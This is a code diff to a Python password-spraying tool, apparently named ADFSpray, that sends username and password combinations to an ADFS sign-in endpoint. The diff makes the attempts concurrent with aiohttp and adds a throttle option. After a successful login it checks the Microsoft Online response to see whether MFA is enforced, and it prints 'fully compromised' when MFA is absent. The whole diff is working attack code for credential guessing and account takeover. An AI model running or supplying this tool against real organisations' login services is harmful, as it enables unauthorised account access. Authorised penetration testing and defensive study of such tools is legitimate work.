@@ -1,10 +1,23 @@
-import requests
 import argparse
 import re
 import html
-import time
+import aiohttp
+import asyncio
 from colorama import Fore, Style
 from datetime import datetime
+
+
+def print_banner():
+    banner = f"""{Fore.CYAN}
+   ___   ___  ________                  
+  / _ | / _ \/ __/ __/__  _______ ___ __
+ / __ |/ // / _/_\ \/ _ \/ __/ _ `/ // /
+/_/ |_/____/_/ /___/ .__/_/  \_,_/\_, / 
+                  /_/            /___/
+
+{Fore.YELLOW}Author: phish (@dunderhay){Style.RESET_ALL}
+    """
+    print(banner)
 
 
 def log_message(message, log_file=None, color=None):
@@ -17,9 +30,9 @@ def log_message(message, log_file=None, color=None):
             log.write(f"[{timestamp}] {message}" + "\n")
 
 
-def extract_saml_assertion(response_content):
+def extract_saml_assertion(adfs_login_response_text):
     wresult_pattern = r'<input type="hidden" name="wresult" value="([^"]+)" \/>'
-    wresult_match = re.search(wresult_pattern, response_content, re.DOTALL)
+    wresult_match = re.search(wresult_pattern, adfs_login_response_text, re.DOTALL)
 
     if wresult_match:
         wresult_value = wresult_match.group(1)
@@ -29,8 +42,8 @@ def extract_saml_assertion(response_content):
         return None
 
 
-def check_mfa_string(login_srf_response):
-    return "BeginAuth" in login_srf_response.text
+def check_mfa_string(login_srf_response_text):
+    return "BeginAuth" in login_srf_response_text
 
 
 def check_authentication_cookies(login_srf_response):
@@ -38,7 +51,7 @@ def check_authentication_cookies(login_srf_response):
     return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies
 
 
-def send_login_request(
+async def send_login_request_async(
     target, username, password, verbose=False, log_file=None, check_mfa=False
 ):
     if verbose:
@@ -55,72 +68,102 @@ def send_login_request(
     }
 
     try:
-        with requests.Session() as session:
-            adfs_login_response = session.post(
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
                 f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
                 data=payload,
                 headers=headers,
-                timeout=10,
-            )
-            adfs_login_response.raise_for_status()
+                timeout=aiohttp.ClientTimeout(total=10),
+            ) as adfs_login_response:
+                adfs_login_response.raise_for_status()
+                adfs_login_response_text = await adfs_login_response.text()
 
-            if (
-                'action="https://login.microsoftonline.com:443/login.srf"'
-                in adfs_login_response.text
-            ):
-                log_message(
-                    f"[+] Login success: {username} : {password}",
-                    log_file,
-                    color=Fore.GREEN,
-                )
+                if (
+                    'action="https://login.microsoftonline.com:443/login.srf"'
+                    in adfs_login_response_text
+                ):
+                    log_message(
+                        f"[+] Login success: {username} : {password}",
+                        log_file,
+                        color=Fore.GREEN,
+                    )
 
-                if check_mfa:
-                    wresult_value = extract_saml_assertion(adfs_login_response.text)
-                    if wresult_value:
-                        login_srf_url = "https://login.microsoftonline.com/login.srf"
-                        login_srf_payload = {
-                            "wa": "wsignin1.0",
-                            "wresult": wresult_value,
-                        }
+                    if check_mfa:
+                        wresult_value = extract_saml_assertion(adfs_login_response_text)
+                        if wresult_value:
+                            login_srf_url = (
+                                "https://login.microsoftonline.com/login.srf"
+                            )
+                            login_srf_payload = {
+                                "wa": "wsignin1.0",
+                                "wresult": wresult_value,
+                            }
 
-                        login_srf_response = session.post(
-                            login_srf_url,
-                            data=login_srf_payload,
-                            headers=headers,
-                            timeout=10,
-                        )
-                        login_srf_response.raise_for_status()
-
-                        if check_authentication_cookies(login_srf_response):
-                            if check_mfa_string(login_srf_response):
-                                log_message(
-                                    f"[-] MFA required for: {username}",
-                                    log_file,
-                                    color=Fore.RED,
+                            async with session.post(
+                                login_srf_url,
+                                data=login_srf_payload,
+                                headers=headers,
+                                timeout=aiohttp.ClientTimeout(total=10),
+                            ) as login_srf_response:
+                                login_srf_response.raise_for_status()
+                                login_srf_response_text = (
+                                    await login_srf_response.text()
                                 )
-                            else:
-                                log_message(
-                                    f"[+] MFA not required for: {username}",
-                                    log_file,
-                                    color=Fore.GREEN,
-                                )
-                    else:
-                        print(
-                            f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
-                        )
-            elif verbose:
-                log_message(
-                    f"[-] Login failed: {username} : {password}",
-                    log_file,
-                    color=Fore.RED,
-                )
 
-    except requests.exceptions.Timeout:
+                                if check_mfa_string(login_srf_response_text):
+                                    log_message(
+                                        f"[-] MFA required for: {username}",
+                                        log_file,
+                                        color=Fore.RED,
+                                    )
+                                else:
+                                    log_message(
+                                        f"[+] MFA not required for: {username}",
+                                        log_file,
+                                        color=Fore.GREEN,
+                                    )
+                                    print(f"=========== 🎉 {username} is fully compromised 🤌 ===========")
+                        else:
+                            print(
+                                f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
+                            )
+                elif verbose:
+                    log_message(
+                        f"[-] Login failed: {username} : {password}",
+                        log_file,
+                        color=Fore.RED,
+                    )
+
+    except asyncio.TimeoutError:
         print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
-    except requests.exceptions.HTTPError as e:
+    except aiohttp.ClientResponseError as e:
         print(f"{Fore.RED}[!] HTTP Error occurred: {e}{Style.RESET_ALL}")
-    except requests.exceptions.RequestException as e:
+    except aiohttp.ClientError as e:
         print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")
+
+
+async def main():
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        semaphore = asyncio.Semaphore(throttle_limit)
+
+        for username in usernames:
+            for password in passwords:
+                task = send_login_request_async(
+                    target,
+                    username.strip(),
+                    password.strip(),
+                    verbose=verbose,
+                    log_file=log_file,
+                    check_mfa=check_mfa,
+                )
+                tasks.append(task)
+
+                if delay:
+                    await asyncio.sleep(delay)
+
+        async with semaphore:
+            await asyncio.gather(*tasks)
 
 
 if __name__ == "__main__":
@@ -131,7 +174,7 @@ if __name__ == "__main__":
         "\n  python script.py -t https://adfs.example.com -u user -p password123"
         "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 --mfa"
         "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt -v -l output.txt"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
+        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -tl 10"
         "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
     )
 
@@ -181,6 +224,7 @@ if __name__ == "__main__":
         help="File to log the login results",
     )
     parser.add_argument(
+        "-mfa",
         "--mfa",
         action="store_true",
         help="Check if Multi-Factor Authentication (MFA) is required after successful login",
@@ -193,8 +237,15 @@ if __name__ == "__main__":
         help="Delay in seconds between login attempts (e.g., --delay 2 for 2 seconds delay)",
     )
 
-    args = parser.parse_args()
+    parser.add_argument(
+        "-tl",
+        "--throttle-limit",
+        type=int,
+        default=1,
+        help="Number of concurrent login attempts allowed (default is 1 at a time)",
+    )
 
+    args = parser.parse_args()
     target = args.target
     usernames = []
     passwords = []
@@ -202,6 +253,7 @@ if __name__ == "__main__":
     check_mfa = args.mfa
     verbose = args.verbose
     delay = args.delay
+    throttle_limit = args.throttle_limit
 
     if args.username:
         usernames.append(args.username)
@@ -229,17 +281,7 @@ if __name__ == "__main__":
             )
             exit(1)
 
+    print_banner()
     log_message(f"[*] Target ADFS Host: {target}", log_file, color=Fore.CYAN)
 
-    for username in usernames:
-        for password in passwords:
-            send_login_request(
-                target,
-                username.strip(),
-                password.strip(),
-                verbose=verbose,
-                log_file=log_file,
-                check_mfa=check_mfa,
-            )
-            if delay:
-                time.sleep(delay)
+    asyncio.run(main())
